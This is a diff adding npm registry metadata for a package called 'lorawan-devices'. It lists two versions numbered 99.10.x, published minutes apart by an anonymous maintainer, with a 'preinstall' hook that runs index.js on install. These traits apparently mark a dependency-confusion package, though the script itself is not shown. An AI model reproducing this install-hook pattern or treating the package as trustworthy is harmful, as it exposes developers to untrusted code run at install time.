@@ -1,0 +1,103 @@
+{
+    "_id": "lorawan-devices",
+    "_rev": "1-a7c069bf7a10a50fb6fe2603283d209f",
+    "name": "lorawan-devices",
+    "dist-tags": {
+        "latest": "99.10.12"
+    },
+    "versions": {
+        "99.10.11": {
+            "name": "lorawan-devices",
+            "version": "99.10.11",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "lorawan-devices@99.10.11",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-xGjPGD7h8VsC5MR8xu0ZCxpoes8S33njcabE9458zm/GnRvZGyG0k2AnZ6dA3/S0mQC3bHEFg+VfWi5N77x2Fw==",
+                "shasum": "4364dffee6a69568a13d743971ed1c94e7433f1d",
+                "tarball": "https://registry.npmjs.org/lorawan-devices/-/lorawan-devices-99.10.11.tgz",
+                "fileCount": 2,
+                "unpackedSize": 4996,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiMRJyACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrR1A//SeIkYVLgOxkYqAp4pN0adbxPbUv6x7uFDIHZrST0lDrO1+LF\r\nGfaP7fy9Te3EwQKNK7XAFLxLcKGpn6po4esNN9zhy5vGeiQALyC+7EhT/LDi\r\nY7jYauadV/qwxDPoTFweGPilwfRSP2K2uBSU89wovll6/jxKj2p2o+oy+oc3\r\nGVHmAmfZEAdytvXuOEvCuFD5eSP3IiYyYuIoIiYQmy6DrJAeQ7EXIMguCkpA\r\nr0TKXvETmxRkQ8VuBf6y3JM3fzV+wKq/LFjJFsK5wy/ieLISDcfVUy21T4uk\r\nNilSC9rA87GWUmI9aup8lK3KNjF+3JikK7nEjMrQiLH2eQTcPRn7aP/0M/Iq\r\nfSgcUW1/FA74his9oaNd2jGBDevRdb8GNtPqlkMyjVESzwGfxy6gmcDK+7gM\r\nVm5nDo4M/DLaFDdbJAe6iMqGb2xP5t3XEaud2L3Vrxop6GTs+DVdZBDLZJgp\r\njRCz1IMjPt4QYYBP83jHDUMT4HYrAWokWKgMJ8zQwKnVKpbnV0ytzJ0JcngN\r\no2oreqLikmsh6XcqZq1BjKYSeK0jGLRgQ4AvM535BAuJ+3Fi1sliY6TdQgnC\r\nK2ZnmWptEV3JZUh2UvcyafQ0i2+BcupfN5nNLacxdvgkpUJVxfXxgAEAw7JW\r\n3eH7rTz1aH8QLeYeCkpfjhaw0f8w+BiqP5E=\r\n=1t57\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "lorawandevices",
+                "email": "lorawandevices@rt11.33mail.com"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "lorawandevices",
+                    "email": "lorawandevices@rt11.33mail.com"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/lorawan-devices_99.10.11_1647383153927_0.2861360948269298"
+            },
+            "_hasShrinkwrap": false
+        },
+        "99.10.12": {
+            "name": "lorawan-devices",
+            "version": "99.10.12",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "lorawan-devices@99.10.12",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-PHtOkxHGfnU7uPBDex20+0a5xXT/x7vcPyROFayPrI7Qh/Aorsaj4z2k95gwYlIcWBy42XhKnt+7zTThsLlOcw==",
+                "shasum": "edfd5b0b67b3ab35f0e263a973e35f892e40a199",
+                "tarball": "https://registry.npmjs.org/lorawan-devices/-/lorawan-devices-99.10.12.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5065,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiMRZaACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpCxw//Z93pDaWaP2RfabvLFzxhg2+pZrhOa7PDU/bWZZoMOcDZoXIf\r\nI+Sj3H0o77RwNkSk5n9a21o2vQshDfhQnm1yvT+pCA1PgZmspudfH4Uf+vt0\r\nKMF2MkNmnCeQH681dPZv3vbpHJDuqHm3UnLXOHhHzwS/KL6fPAeFMV0TQ+6Y\r\nJ6qhCO1eQ0F0Nszhw0CejDgiQuUphT4ONR7Fg2Cu487KG/gret3or9RPI3BO\r\nEXzWjjmyRdV8PpJTOwradze2skGosllv/5GetzWh9/fhqISGr/Sx7TgMTkba\r\n1giVAJTWo9RXVxmEKQht3KcUXFtLlJYIFk9IFcLa1y0HukPqzx4M56LA/CIP\r\n/lv/evFeL+WG7Zeq6aqWTWn6nPf2JoLWquocp1v5N9OI3HvbgUkgjJYTj5Eh\r\nsxCM4giSoXHtegDz7ER8Q0A3aP2Cg5V0HF8J2M3jjJQe7r2KHrpdGd9J6MsN\r\nzR9CVgL1VHy2OrV9HMMU1PAIToqO/ghmWh1/sbNMiwEQXxexhILpJJHZeUGD\r\nGm+LcShr8h1X89ebRMb5lbSw5eUqLb38QT0SnturIctV+q+nCDDbkxUGDMmQ\r\n9Ux79tQ66XLsHASM1z68Az9C9t9ex/Jvnde9CEKd+3k6Qqa9HFqqpa8RinHH\r\nf+mSs7W3pr78oZDrp6naJLGZOqb2vUIl2m0=\r\n=Xj+n\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "lorawandevices",
+                "email": "lorawandevices@rt11.33mail.com"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "lorawandevices",
+                    "email": "lorawandevices@rt11.33mail.com"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/lorawan-devices_99.10.12_1647384154600_0.14120077561105115"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-15T22:25:53.927Z",
+        "99.10.11": "2022-03-15T22:25:54.074Z",
+        "modified": "2022-03-15T22:42:34.763Z",
+        "99.10.12": "2022-03-15T22:42:34.731Z"
+    },
+    "maintainers": [
+        {
+            "name": "lorawandevices",
+            "email": "lorawandevices@rt11.33mail.com"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
